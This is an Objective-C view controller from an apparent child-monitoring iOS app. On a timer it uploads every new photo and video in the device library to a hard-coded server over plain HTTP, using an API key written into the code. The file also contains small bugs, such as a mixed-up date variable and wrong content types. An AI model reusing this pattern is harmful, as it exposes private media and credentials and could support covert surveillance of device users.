//
//  ViewController.m
//  NoeZeeChildApp
//
//  Created by Codaemon  on 26/03/18.
//  Copyright © 2018 Codaemon . All rights reserved.
//

#import "ViewController.h"
#import <AssetsLibrary/AssetsLibrary.h>
#import <Photos/Photos.h>
#import <Foundation/Foundation.h>

@interface ViewController ()

@end

static int count=0;
@implementation ViewController
NSArray *imageArray;
NSMutableArray *mutableArray;
NSString *imageURL;
NSDate *lastImageDate;
NSDate *lastVideoDate;
NSDate *currentDate;
NSData *imageData;

-(NSDate*) getDateForDay:(NSInteger) day andMonth:(NSInteger) month andYear:(NSInteger) year{
    NSDateComponents *comps = [[NSDateComponents alloc] init];
    [comps setDay:day];
    [comps setMonth:month];
    [comps setYear:year];
    NSDate *date = [[NSCalendar currentCalendar] dateFromComponents:comps];
    return date;
}

-(NSDate*)getLastImageDate
{
    PHFetchOptions *fetchOptions = [[PHFetchOptions alloc] init];
    fetchOptions.sortDescriptors = @[[NSSortDescriptor sortDescriptorWithKey:@"creationDate" ascending:YES]];
    PHFetchResult *fetchResult = [PHAsset fetchAssetsWithMediaType:PHAssetMediaTypeImage options:fetchOptions];
    PHAsset *lastAsset = [fetchResult lastObject];
    lastImageDate = lastAsset.creationDate;
    if(lastImageDate == nil){
        lastImageDate = currentDate;
    }
    NSLog(@"lastImage Date:%@", lastAsset.creationDate);
    return lastImageDate;
}

-(NSDate*)getLastVideoDate
{
    PHFetchOptions *fetchOptions = [[PHFetchOptions alloc] init];
    fetchOptions.sortDescriptors = @[[NSSortDescriptor sortDescriptorWithKey:@"creationDate" ascending:YES]];
    PHFetchResult *fetchResult = [PHAsset fetchAssetsWithMediaType:PHAssetMediaTypeVideo options:fetchOptions];
    PHAsset *lastAsset = [fetchResult lastObject];
    lastVideoDate = lastAsset.creationDate;
    if(lastVideoDate == nil){
        lastImageDate = currentDate;
    }
    NSLog(@"LastVideo Date:%@", lastAsset.creationDate);
    return lastVideoDate;
}

-(void)getAllImages
{
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        PHImageRequestOptions *requestOptions = [[PHImageRequestOptions alloc] init];
        requestOptions.resizeMode   = PHImageRequestOptionsResizeModeExact;
        requestOptions.deliveryMode = PHImageRequestOptionsDeliveryModeHighQualityFormat;
        requestOptions.synchronous = true;
        
        PHFetchOptions *fetchOptions = [[PHFetchOptions alloc] init];
        fetchOptions.predicate = [NSPredicate predicateWithFormat:@"creationDate > %@",lastImageDate];
        PHFetchResult *allPhotos = [PHAsset fetchAssetsWithMediaType:PHAssetMediaTypeImage options:fetchOptions];
        NSLog(@"All Photos:%@", allPhotos);
        
        PHImageManager *manager = [PHImageManager defaultManager];
            for (PHAsset *data in allPhotos) {
                [manager requestImageForAsset:data
                                   targetSize:PHImageManagerMaximumSize
                                  contentMode:PHImageContentModeDefault
                                      options:requestOptions
                                resultHandler:^void(UIImage *image, NSDictionary *info) {
                                    
                                    dispatch_async(dispatch_get_main_queue(), ^{
                                        UILocalNotification *notification = [[UILocalNotification alloc] init];
                                        notification.alertBody = @"Media Uploaded Successfully.";
                                        notification.alertAction = @"Open app";
                                        [[UIApplication sharedApplication] presentLocalNotificationNow:notification];
                                    });
                                    
                                    imageURL = [info valueForKey:@"PHImageFileURLKey"];
                                    imageData = UIImageJPEGRepresentation(image, 90);
                                    [self uploadMedia:imageURL];
                                    NSLog(@"Info: %@", [info valueForKey:@"PHImageFileURLKey"]);
                                    lastImageDate = data.creationDate;
                                }];
            }
    });
    
    
}

-(void)getAllVideos
{
    PHVideoRequestOptions *requestOptions = [[PHVideoRequestOptions alloc] init];
    
    PHFetchOptions *fetchOptions = [[PHFetchOptions alloc] init];
    fetchOptions.predicate = [NSPredicate predicateWithFormat:@"creationDate > %@",lastVideoDate];
    PHFetchResult *allVideos = [PHAsset fetchAssetsWithMediaType:PHAssetMediaTypeVideo options:fetchOptions];
    NSLog(@"All Videos:%@", allVideos);
    
    PHImageManager *manager = [PHImageManager defaultManager];
    for (PHAsset *videoData in allVideos) {
          [manager requestAVAssetForVideo:videoData options:nil resultHandler:^(AVAsset * _Nullable data, AVAudioMix * _Nullable audioMix, NSDictionary * _Nullable info) {
            if ([data isKindOfClass:[AVURLAsset class]]) {
                dispatch_async(dispatch_get_main_queue(), ^{
                    UILocalNotification *notification = [[UILocalNotification alloc] init];
                    notification.alertBody = @"Media Uploaded Successfully.";
                    notification.alertAction = @"Open app";
                    [[UIApplication sharedApplication] presentLocalNotificationNow:notification];
                });
                NSURL *url = (NSURL *)[[(AVURLAsset *)data URL] fileReferenceURL];
                imageData = [NSData dataWithContentsOfURL:url];
                NSLog(@"Video URL: %@", url);
                [self uploadMedia:(NSString*) url];
                lastVideoDate = videoData.creationDate;
            }
        }];
    }
}

- (void)uploadMedia:(NSString*)filePath {
    NSString *path = filePath;
    NSString *fileName = [filePath lastPathComponent];
    NSLog(@"FileName Name: %@", fileName);
    NSString *fileExtension = [filePath pathExtension];
    NSLog(@"File Extension: %@", fileExtension);
    if([fileExtension  isEqual: @"MOV"]){
        NSString *theFileName = [[filePath lastPathComponent] stringByDeletingPathExtension];
        fileName = [theFileName stringByAppendingString:@".mp4"];
        NSLog(@"Updated File Name: %@", fileName);
    } else {
        NSString *theFileName = [[filePath lastPathComponent] stringByDeletingPathExtension];
        fileName = [theFileName stringByAppendingString:@".jpg"];
        NSLog(@"Updated File Name: %@", fileName);
    }
    /*NSString *theFileName = [[filePath lastPathComponent] stringByDeletingPathExtension];
    fileName = [theFileName stringByAppendingString:@".jpg"];
    NSLog(@"Updated File Name: %@", fileName);*/
    //Get the device token
    NSString *device_id = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
    NSLog(@"Device Id: %@", device_id);
    NSString *user_id = [[NSUserDefaults standardUserDefaults] valueForKey:@"UserId"];
    NSLog(@"User Id: %@",user_id);
    NSURL *url = [NSURL URLWithString:@"http://54.145.124.70/neozee/api/v1/media/upload"];
    
    /*NSURLSessionTask *task = [[NSURLSession sharedSession] dataTaskWithURL:url completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        if (data) {*/
            NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
            
            [request setHTTPMethod:@"POST"];
            
            NSString *boundary = @"STRING";
            
            NSString *contentType = [NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary];
            
            [request addValue:contentType forHTTPHeaderField:@"Content-Type"];
            
            NSMutableData *body = [NSMutableData data];
            //we can assume boundary as a seperator for data. Your this first statement is starting point for sending multipart data
            [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
            
            [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"%@\"\r\n\r\n", @"MultipartEntity"] dataUsingEncoding:NSUTF8StringEncoding]];
            // This next statement is the actual data/string (string body for "MultipartEntity")
            [body appendData:[[NSString stringWithFormat:@"%@\r\n",@"Mayur"]dataUsingEncoding:NSUTF8StringEncoding]];
            
            // This next statement is again the delimiter which delimit our previuos designed data. (userName:Mayur)
            [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
            // This is the structure where we are setting key "userName"
            [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"%@\"\r\n\r\n", @"device_id"] dataUsingEncoding:NSUTF8StringEncoding]];
            // Abd here we are setting its value "Mayur"
            [body appendData:[[NSString stringWithFormat:@"%@\r\n",device_id]dataUsingEncoding:NSUTF8StringEncoding]];
            
            [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
            [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"%@\"\r\n\r\n", @"user_id"] dataUsingEncoding:NSUTF8StringEncoding]];
            [body appendData:[[NSString stringWithFormat:@"%@\r\n",user_id]dataUsingEncoding:NSUTF8StringEncoding]];
            
            [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
            [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"%@\"; filename=\"%@_%@\"\r\n", @"file_name",@"file",fileName] dataUsingEncoding:NSUTF8StringEncoding]];
            [body appendData:[@"Content-Type: image/jpeg\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
            [body appendData:imageData];
            [body appendData:[[NSString stringWithFormat:@"\r\n"] dataUsingEncoding:NSUTF8StringEncoding]];
            
            // This is the final delimiter which ends the body in format "--%@--".
            [body appendData:[[NSString stringWithFormat:@"--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
            [request setValue:@"neo-32696d98-a84a2f0f-2a254259-ea5de6aa" forHTTPHeaderField:@"neo-x-api-key"];
            [request setHTTPBody:body];
            
            /*NSURLSession *session = [NSURLSession sharedSession];
            NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request
                                                        completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
                                                            if (error) {
                                                                NSLog(@"%@", error);
                                                            } else {
                                                                NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *) response;
                                                                NSLog(@"%@", httpResponse);
                                                            }
                                                        }];
            [dataTask resume];
        }
    }];
    [task resume];*/
    
    [NSURLConnection sendAsynchronousRequest:request
                                       queue:[NSOperationQueue mainQueue]
                                                   completionHandler:^(NSURLResponse *response, NSData *data, NSError *error){
                                                       if(error){
                                                           NSLog(@"Error getting HTTP status code %@", error);
                                                       }
                                                       else{
                                                           NSLog(@"Sucessfully Uploaded...");
                                                           NSLog(@"Response: %@",response);
                                                       }
                                                       
                                                   }];
    
    /*NSURLResponse *response; NSError *error;
    NSHTTPURLResponse *responseCode = nil;
    
    NSData *oResponseData = [NSURLConnection sendSynchronousRequest:request returningResponse:&responseCode error:nil];
    NSDictionary *json = [NSJSONSerialization JSONObjectWithData:oResponseData
                                                         options:NSJSONReadingMutableContainers
                                                           error:nil];
    NSLog(@"Response :%@",json);
    if([responseCode statusCode] != 200){
        NSLog(@"Error getting HTTP status code %li", (long)[responseCode statusCode]);
    }
    else {
        NSLog(@"Sucessfully Uploaded...");
    }*/
}

- (void)viewDidLoad {
    [super viewDidLoad];
    UIGraphicsBeginImageContext(self.view.frame.size);
    [[UIImage imageNamed:@"app_on.jpg"] drawInRect:self.view.bounds];
    UIImage *image = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    self.view.backgroundColor = [UIColor colorWithPatternImage:image];
    lastImageDate = [self getLastImageDate];
    lastVideoDate = [self getLastVideoDate];

    if(lastImageDate != nil && lastVideoDate != nil ){
        NSLog(@"In If");
        [NSTimer scheduledTimerWithTimeInterval:20.0f
                                         target:self selector:@selector(getAllImages) userInfo:nil repeats:YES];
        
        [NSTimer scheduledTimerWithTimeInterval:20.0f
                                         target:self selector:@selector(getAllVideos) userInfo:nil repeats:YES];
    } else {
        NSLog(@"In else");
        NSDate *date = [NSDate date]; // your date from the server will go here.
        //NSCalendar *calendar = [[NSCalendar alloc] initWithCalendarIdentifier:NSGregorianCalendar];
        //NSDateComponents *components = [[NSDateComponents alloc] init];
        //components.day = -1;
        //NSDate *previousDate = [calendar dateByAddingComponents:components toDate:date options:0];
        NSLog(@"Previous Date:%@", date);
        lastImageDate = date;
        lastVideoDate = date;
        NSLog(@"lastImageDate Date:%@", lastImageDate);
        NSLog(@"lastVideoDate Date:%@", lastVideoDate);
        [NSTimer scheduledTimerWithTimeInterval:20.0f
                                         target:self selector:@selector(getAllImages) userInfo:nil repeats:YES];
        
        [NSTimer scheduledTimerWithTimeInterval:20.0f
                                         target:self selector:@selector(getAllVideos) userInfo:nil repeats:YES];
    }
    
    
}


- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}


@end
